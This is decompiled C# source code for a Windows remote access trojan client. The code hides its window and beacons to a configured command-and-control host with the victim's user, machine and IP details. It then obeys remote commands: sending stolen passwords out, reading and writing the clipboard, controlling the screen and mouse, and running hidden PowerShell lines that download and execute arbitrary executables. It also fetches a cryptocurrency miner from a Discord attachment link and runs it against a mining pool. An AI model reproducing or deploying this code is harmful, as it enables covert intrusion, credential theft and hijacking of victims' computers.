using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Stub
{
	// Token: 0x02000059 RID: 89
	public class Program
	{
		// Token: 0x17000004 RID: 4
		// (get) Token: 0x06000129 RID: 297 RVA: 0x00002327 File Offset: 0x00000527
		// (set) Token: 0x0600012A RID: 298 RVA: 0x0000232F File Offset: 0x0000052F
		public int Int32_0 { get; set; }

		// Token: 0x0600012B RID: 299
		[DllImport("user32.dll")]
		public static extern bool CloseClipboard();

		// Token: 0x0600012C RID: 300
		[DllImport("User32.dll", SetLastError = true)]
		public static extern IntPtr GetClipboardData(uint uint_0);

		// Token: 0x0600012D RID: 301
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetConsoleWindow();

		// Token: 0x0600012E RID: 302
		[DllImport("Kernel32.dll", SetLastError = true)]
		public static extern IntPtr GlobalLock(IntPtr intptr_0);

		// Token: 0x0600012F RID: 303
		[DllImport("Kernel32.dll", SetLastError = true)]
		public static extern int GlobalSize(IntPtr intptr_0);

		// Token: 0x06000130 RID: 304
		[DllImport("Kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool GlobalUnlock(IntPtr intptr_0);

		// Token: 0x06000131 RID: 305 RVA: 0x00007F58 File Offset: 0x00006158
		[STAThread]
		[MethodImpl(MethodImplOptions.NoOptimization)]
		public static void Main(string[] args)
		{
			string value = "1000";
			string value2 = "Default";
			string value3 = "Mutex_25840020";
			string string_ = "127.0.0.1";
			string value4 = "5656";
			string text = "Startup - Disabled";
			Program.ShowWindow(Program.GetConsoleWindow(), 0);
			if (!Assembly.GetExecutingAssembly().Location.Contains("cvtres.exe"))
			{
				Class4.smethod_0();
				return;
			}
			Thread.Sleep(Conversions.ToInteger(value));
			if (text.Contains("Enabled"))
			{
				Class10.smethod_1();
			}
			try
			{
				Mutex mutex = new Mutex(false, Conversions.ToString(value3));
				if (!mutex.WaitOne(0, false))
				{
					mutex.Close();
					ProjectData.EndApp();
				}
			}
			catch (Exception ex)
			{
			}
			try
			{
				GClass0.String_1 = Conversions.ToString(value2);
			}
			catch (Exception ex2)
			{
			}
			try
			{
				GClass0.String_0 = string_;
			}
			catch (Exception ex3)
			{
			}
			try
			{
				GClass0.int_0 = Conversions.ToInteger(value4);
			}
			catch (Exception ex4)
			{
			}
			try
			{
				GClass0.bool_0 = Conversions.ToBoolean(GClass0.smethod_21());
			}
			catch (Exception ex5)
			{
			}
			try
			{
				GClass0.int_5 = GClass0.gdelegate9_0(4);
			}
			catch (Exception ex6)
			{
			}
			try
			{
				if (GClass0.int_5 < 5)
				{
					GClass0.int_5 = 20;
				}
			}
			catch (Exception ex7)
			{
			}
			try
			{
				GClass0.String_2 = Environment.UserName + "@" + Environment.MachineName;
			}
			catch (Exception ex8)
			{
			}
			try
			{
				GClass0.int_1 = Screen.PrimaryScreen.Bounds.Width;
			}
			catch (Exception ex9)
			{
			}
			try
			{
				GClass0.int_2 = Screen.PrimaryScreen.Bounds.Height;
			}
			catch (Exception ex10)
			{
			}
			try
			{
				Program.smethod_1(GClass0.String_0, GClass0.int_0);
			}
			catch (Exception ex11)
			{
			}
			for (;;)
			{
				Thread.Sleep(100);
			}
		}

		// Token: 0x06000132 RID: 306
		[DllImport("user32.dll")]
		public static extern bool OpenClipboard(IntPtr intptr_0);

		// Token: 0x06000133 RID: 307
		[DllImport("user32.dll")]
		public static extern bool SetClipboardData(uint uint_0, IntPtr intptr_0);

		// Token: 0x06000134 RID: 308
		[DllImport("user32.dll")]
		public static extern bool ShowWindow(IntPtr intptr_0, int int_2);

		// Token: 0x06000135 RID: 309 RVA: 0x000081D4 File Offset: 0x000063D4
		public static bool smethod_0()
		{
			DateTime startTime = Process.GetCurrentProcess().StartTime;
			DateTime startTime2 = (from process_0 in Process.GetProcessesByName("explorer")
			orderby process_0.StartTime
			select process_0).Last<Process>().StartTime;
			return Process.GetProcessesByName("explorer").Length == 1 || (startTime2 - startTime).Minutes <= 0;
		}

		// Token: 0x06000136 RID: 310 RVA: 0x0000824C File Offset: 0x0000644C
		public static void smethod_1(string String_10, int int_2)
		{
			for (;;)
			{
				GClass0.tcpClient_0 = new TcpClient();
				Thread.Sleep(1000);
				try
				{
					GClass0.tcpClient_0.Connect(String_10, int_2);
				}
				catch (Exception ex)
				{
					continue;
				}
				break;
			}
			GClass0.networkStream_0 = GClass0.tcpClient_0.GetStream();
			GClass0.networkStream_0.BeginRead(new byte[1], 0, 0, new AsyncCallback(Program.smethod_4), null);
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
				string text = (string)((registryKey != null) ? registryKey.GetValue("productName") : null);
				RegionInfo currentRegion = RegionInfo.CurrentRegion;
				if (!File.Exists(Interaction.Environ("APPDATA") + "\\RegisterDate"))
				{
					File.WriteAllText(Interaction.Environ("APPDATA") + "\\RegisterDate", DateTime.UtcNow.ToString("MM/dd/yyyy"));
				}
				string text2 = File.ReadAllText(Interaction.Environ("APPDATA") + "\\RegisterDate");
				GClass0.smethod_2(GClass0.networkStream_0, string.Concat(new string[]
				{
					"845678845|",
					GClass0.String_1,
					"_ | ",
					GClass0.String_2,
					"|",
					currentRegion.Name,
					"|",
					text,
					"|",
					Program.smethod_3(),
					"|",
					text2,
					"|1.3.1.2|",
					Program.smethod_2()
				}));
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x06000137 RID: 311 RVA: 0x00008408 File Offset: 0x00006608
		public static void smethod_10(string String_10)
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "powershell.exe",
				Arguments = String_10,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false
			});
			GClass0.smethod_2(GClass0.networkStream_0, "309|");
		}

		// Token: 0x06000138 RID: 312 RVA: 0x00008458 File Offset: 0x00006658
		public static void smethod_11()
		{
			try
			{
				Directory.CreateDirectory(Class30.String_3);
				Class12.smethod_0();
				GClass0.smethod_2(GClass0.networkStream_0, "312|");
				if (!File.Exists(Class30.String_3 + "\\Passwords.txt"))
				{
					GClass0.smethod_2(GClass0.networkStream_0, "313|");
				}
				else
				{
					string value = File.ReadAllText(Class30.String_3 + "\\Passwords.txt");
					GClass0.smethod_2(GClass0.networkStream_0, "874|" + GClass0.String_2 + "|" + Conversions.ToString(value));
					File.Delete(Class30.String_3 + "\\Passwords.txt");
					Directory.Delete(Class30.String_3);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000139 RID: 313 RVA: 0x00008520 File Offset: 0x00006720
		public static void smethod_12(string String_10, string String_11, string String_12, string String_13)
		{
			byte[] bytes = new WebClient().DownloadData(Program.String_9);
			string text = Path.Combine(Path.GetTempPath(), Program.smethod_7(6) + ".exe");
			File.WriteAllBytes(text, bytes);
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = string.Concat(new string[]
				{
					"/c ",
					text,
					" -P stratum://",
					String_12,
					".",
					Program.smethod_7(5),
					":",
					String_13,
					"x@",
					String_10,
					":",
					String_11
				}),
				CreateNoWindow = false,
				WindowStyle = ProcessWindowStyle.Normal,
				UseShellExecute = true,
				ErrorDialog = false
			});
			GClass0.smethod_2(GClass0.networkStream_0, "310|");
		}

		// Token: 0x0600013A RID: 314 RVA: 0x00002338 File Offset: 0x00000538
		public static void smethod_13()
		{
			Process.Start("explorer");
			GClass0.smethod_2(GClass0.networkStream_0, "303|");
		}

		// Token: 0x0600013B RID: 315 RVA: 0x00002354 File Offset: 0x00000554
		public static void smethod_14()
		{
			Process.Start("cmd");
			GClass0.smethod_2(GClass0.networkStream_0, "300|");
		}

		// Token: 0x0600013C RID: 316 RVA: 0x00002370 File Offset: 0x00000570
		public static void smethod_15()
		{
			Process.Start("powershell");
			GClass0.smethod_2(GClass0.networkStream_0, "301|");
		}

		// Token: 0x0600013D RID: 317 RVA: 0x0000238C File Offset: 0x0000058C
		public static void smethod_16()
		{
			Process.Start("notepad");
			GClass0.smethod_2(GClass0.networkStream_0, "302|");
		}

		// Token: 0x0600013E RID: 318 RVA: 0x000023A8 File Offset: 0x000005A8
		public static void smethod_17()
		{
			GClass0.SendMessage((int)GClass0.intptr_1, 16, 0, null);
		}

		// Token: 0x0600013F RID: 319 RVA: 0x00008604 File Offset: 0x00006804
		public static void smethod_18()
		{
			IntPtr intptr_ = GClass0.intptr_1;
			if (GClass0.gdelegate7_0(intptr_))
			{
				GClass0.ShowWindow(intptr_, 9);
				return;
			}
			GClass0.ShowWindow(intptr_, 3);
		}

		// Token: 0x06000140 RID: 320 RVA: 0x000023BE File Offset: 0x000005BE
		public static void smethod_19()
		{
			GClass0.ShowWindow(GClass0.intptr_1, 6);
		}

		// Token: 0x06000141 RID: 321 RVA: 0x00008638 File Offset: 0x00006838
		public static string smethod_2()
		{
			string result;
			try
			{
				result = new StreamReader(WebRequest.Create("http://checkip.dyndns.org").GetResponse().GetResponseStream()).ReadToEnd().Trim().Split(new char[]
				{
					':'
				})[1].Substring(1).Split(new char[]
				{
					'<'
				})[0];
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000142 RID: 322 RVA: 0x000086B4 File Offset: 0x000068B4
		public static void smethod_20()
		{
			IntPtr intptr_ = (GClass0.FindWindowEx((IntPtr)0, (IntPtr)0, (IntPtr)49175, "Start") == IntPtr.Zero) ? GClass0.gdelegate6_0(GClass0.FindWindow("Shell_TrayWnd", null), 5U) : GClass0.FindWindowEx((IntPtr)0, (IntPtr)0, (IntPtr)49175, "Start");
			GClass0.PostMessage(intptr_, 513U, (IntPtr)0L, (IntPtr)GClass0.smethod_16(2, 2));
			GClass0.PostMessage(intptr_, 514U, (IntPtr)0L, (IntPtr)GClass0.smethod_16(2, 2));
		}

		// Token: 0x06000143 RID: 323 RVA: 0x00008764 File Offset: 0x00006964
		public static string smethod_21()
		{
			string result;
			try
			{
				if (!Program.OpenClipboard(IntPtr.Zero))
				{
					result = null;
				}
				else
				{
					IntPtr clipboardData = Program.GetClipboardData(13U);
					if (!(clipboardData == IntPtr.Zero))
					{
						IntPtr intPtr = IntPtr.Zero;
						try
						{
							intPtr = Program.GlobalLock(clipboardData);
							if (intPtr == IntPtr.Zero)
							{
								return null;
							}
							int num = Program.GlobalSize(clipboardData);
							byte[] array = new byte[num];
							Marshal.Copy(intPtr, array, 0, num);
							return Encoding.Unicode.GetString(array).TrimEnd(new char[1]);
						}
						finally
						{
							if (intPtr != IntPtr.Zero)
							{
								Program.GlobalUnlock(clipboardData);
							}
						}
					}
					result = null;
				}
			}
			finally
			{
				Program.CloseClipboard();
			}
			return result;
		}

		// Token: 0x06000144 RID: 324 RVA: 0x00008828 File Offset: 0x00006A28
		public static object smethod_22()
		{
			GClass0.SendMessage((int)GClass0.intptr_0, 258, 3, null);
			GClass0.SendMessage((int)GClass0.intptr_0, 769, 0, null);
			GClass0.PostMessage(GClass0.intptr_0, 258U, (IntPtr)3, IntPtr.Zero);
			GClass0.PostMessage(GClass0.intptr_0, 769U, (IntPtr)0, (IntPtr)0);
			return Program.smethod_21();
		}

		// Token: 0x06000145 RID: 325 RVA: 0x000088A0 File Offset: 0x00006AA0
		public static void smethod_23(string String_10)
		{
			try
			{
				Program.OpenClipboard(IntPtr.Zero);
				IntPtr intPtr = Marshal.StringToHGlobalUni(String_10);
				Program.SetClipboardData(13U, intPtr);
				Program.CloseClipboard();
				Marshal.FreeHGlobal(intPtr);
				GClass0.SendMessage((int)GClass0.intptr_0, 770, 0, null);
			}
			catch
			{
			}
		}

		// Token: 0x06000146 RID: 326 RVA: 0x00008900 File Offset: 0x00006B00
		public static string smethod_3()
		{
			string result;
			try
			{
				PingReply pingReply = new Ping().Send("google.com");
				if (pingReply.Status == IPStatus.Success)
				{
					result = pingReply.RoundtripTime.ToString() + " ms";
				}
				else
				{
					result = "0 ms";
				}
			}
			catch (Exception ex)
			{
				result = "0 ms";
			}
			return result;
		}

		// Token: 0x06000147 RID: 327 RVA: 0x0000896C File Offset: 0x00006B6C
		public static void smethod_4(IAsyncResult iasyncResult_0)
		{
			checked
			{
				try
				{
					TcpClient tcpClient_ = GClass0.tcpClient_0;
					lock (tcpClient_)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						byte[] array = new byte[8];
						int i = 8;
						int num = 0;
						while (i > 0)
						{
							int num2 = GClass0.networkStream_0.Read(array, num, i);
							if (num2 == 0)
							{
								throw new SocketException(10054);
							}
							int num3 = num2;
							i -= num3;
							num += num3;
						}
						ulong num4 = BitConverter.ToUInt64(array, 0);
						byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];
						object objectValue;
						using (MemoryStream memoryStream = new MemoryStream())
						{
							int num5 = 0;
							int j = array2.Length;
							while (j > 0)
							{
								int num6 = GClass0.networkStream_0.Read(array2, num5, j);
								if (num6 == 0)
								{
									throw new SocketException(10054);
								}
								int num7 = num6;
								j -= num7;
								num5 += num7;
							}
							memoryStream.Write(array2, 0, (int)num4);
							memoryStream.Position = 0L;
							objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream)));
							memoryStream.Close();
							memoryStream.Dispose();
						}
						Program.smethod_5(RuntimeHelpers.GetObjectValue(objectValue));
						GClass0.networkStream_0.BeginRead(new byte[1], 0, 0, new AsyncCallback(Program.smethod_4), null);
					}
				}
				catch (Exception ex)
				{
					try
					{
						try
						{
							GClass0.tcpClient_0.Close();
						}
						catch (Exception ex2)
						{
						}
						GClass0.thread_0.Abort();
						Program.smethod_1(GClass0.String_0, GClass0.int_0);
					}
					catch (Exception ex3)
					{
					}
				}
			}
		}

		// Token: 0x06000148 RID: 328 RVA: 0x00008BA8 File Offset: 0x00006DA8
		public static void smethod_5(object object_0)
		{
			try
			{
				object obj = Strings.Split(Conversions.ToString(object_0), "*", -1, CompareMethod.Text);
				ThreadPool.QueueUserWorkItem(new WaitCallback(Program.smethod_6), RuntimeHelpers.GetObjectValue(obj));
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000149 RID: 329 RVA: 0x00008C00 File Offset: 0x00006E00
		public static void smethod_6(object object_0)
		{
			try
			{
				object left = NewLateBinding.LateIndexGet(object_0, new object[]
				{
					0
				}, null);
				if (Operators.ConditionalCompareObjectEqual(left, 0, false))
				{
					try
					{
						GClass0.smethod_2(GClass0.networkStream_0, "0|" + Conversions.ToString(GClass0.int_1) + "|" + Conversions.ToString(GClass0.int_2));
					}
					catch (Exception ex)
					{
					}
					GClass0.thread_0 = new Thread(new ThreadStart(GClass0.smethod_17));
					GClass0.thread_0.SetApartmentState(ApartmentState.STA);
					GClass0.thread_0.IsBackground = true;
					GClass0.thread_0.Start();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 1, false))
				{
					GClass0.thread_0.Abort();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 2, false))
				{
					GClass0.smethod_6(Conversions.ToInteger(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						2
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 3, false))
				{
					GClass0.smethod_8(Conversions.ToInteger(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						2
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 4, false))
				{
					GClass0.smethod_7(Conversions.ToInteger(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						2
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 5, false))
				{
					GClass0.smethod_9(Conversions.ToInteger(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						2
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 6, false))
				{
					GClass0.smethod_10(Conversions.ToInteger(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						2
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 7, false))
				{
					GClass0.smethod_12(Conversions.ToString(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 8, false))
				{
					GClass0.smethod_11(Conversions.ToInteger(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						2
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 9, false))
				{
					GClass0.smethod_2(GClass0.networkStream_0, Operators.ConcatenateObject("99|", Program.smethod_22()));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 10, false))
				{
					Program.smethod_23(Conversions.ToString(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 13, false))
				{
					Program.smethod_20();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 14, false))
				{
					Program.smethod_19();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 15, false))
				{
					Program.smethod_18();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 16, false))
				{
					Program.smethod_17();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 17, false))
				{
					GClass0.int_3 = Conversions.ToInteger(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 18, false))
				{
					GClass0.int_4 = Conversions.ToInteger(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 19, false))
				{
					GClass0.double_0 = Conversions.ToDouble(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 20, false))
				{
					GClass5.smethod_0(Conversions.ToBoolean(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 21, false))
				{
					Program.smethod_13();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 24, false))
				{
					Process.GetCurrentProcess().Kill();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 43, false))
				{
					Program.smethod_11();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 44, false))
				{
					Program.smethod_12(Conversions.ToString(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						2
					}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						3
					}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						4
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 45, false))
				{
					Program.smethod_9(Conversions.ToString(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 46, false))
				{
					Program.smethod_8(Conversions.ToString(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 47, false))
				{
					Program.smethod_14();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 48, false))
				{
					Program.smethod_15();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 49, false))
				{
					Program.smethod_16();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 50, false))
				{
					GClass6.smethod_0(Conversions.ToBoolean(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)), Conversions.ToBoolean(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						2
					}, null)), Conversions.ToBoolean(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						3
					}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						4
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 51, false))
				{
					GClass7.smethod_0(Conversions.ToBoolean(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)), Conversions.ToBoolean(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						2
					}, null)), Conversions.ToBoolean(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						3
					}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						4
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 52, false))
				{
					GClass8.smethod_0(Conversions.ToBoolean(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)), Conversions.ToBoolean(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						2
					}, null)), Conversions.ToBoolean(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						3
					}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						4
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 53, false))
				{
					GClass9.smethod_0(Conversions.ToBoolean(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						1
					}, null)), Conversions.ToBoolean(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						2
					}, null)), Conversions.ToBoolean(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						3
					}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(object_0, new object[]
					{
						4
					}, null)));
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x0600014A RID: 330 RVA: 0x000023CC File Offset: 0x000005CC
		public static string smethod_7(int int_2)
		{
			return new string((from String_0 in Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", int_2)
			select String_0[Program.random_0.Next(String_0.Length)]).ToArray<char>());
		}

		// Token: 0x0600014B RID: 331 RVA: 0x0000945C File Offset: 0x0000765C
		public static void smethod_8(string String_10)
		{
			string text = Program.smethod_7(5);
			Program.smethod_10(string.Concat(new string[]
			{
				"powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('",
				String_10,
				"','",
				Path.GetTempPath(),
				text,
				".exe');Start-Process ('",
				Path.GetTempPath(),
				text,
				".exe')"
			}));
		}

		// Token: 0x0600014C RID: 332 RVA: 0x000094C0 File Offset: 0x000076C0
		public static void smethod_9(string String_10)
		{
			string text = Program.smethod_7(5);
			Program.smethod_10(string.Concat(new string[]
			{
				"powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('",
				String_10,
				"','",
				Path.GetTempPath(),
				text,
				".exe');Start-Process ('",
				Path.GetTempPath(),
				text,
				".exe')"
			}));
			Process.GetCurrentProcess().Kill();
		}

		// Token: 0x040000E4 RID: 228
		public static Random random_0 = new Random();

		// Token: 0x040000E5 RID: 229
		public string String_0 = "%Delay%";

		// Token: 0x040000E6 RID: 230
		public string String_1 = "%Identifier%";

		// Token: 0x040000E7 RID: 231
		public static string String_2 = "%Mutex%";

		// Token: 0x040000E8 RID: 232
		public static string String_3 = "%IP%";

		// Token: 0x040000E9 RID: 233
		public static string String_4 = "%Port%";

		// Token: 0x040000EA RID: 234
		public static string String_5 = "%Startup%";

		// Token: 0x040000EB RID: 235
		public static string String_6 = "%FileName%";

		// Token: 0x040000EC RID: 236
		public static string String_7 = "%FolderName%";

		// Token: 0x040000ED RID: 237
		public static string String_8 = "%PathName%";

		// Token: 0x040000EE RID: 238
		public static string String_9 = "https://cdn.discordapp.com/attachments/859410781241475093/907881277804400691/ETHMiner.exe";
	}
}
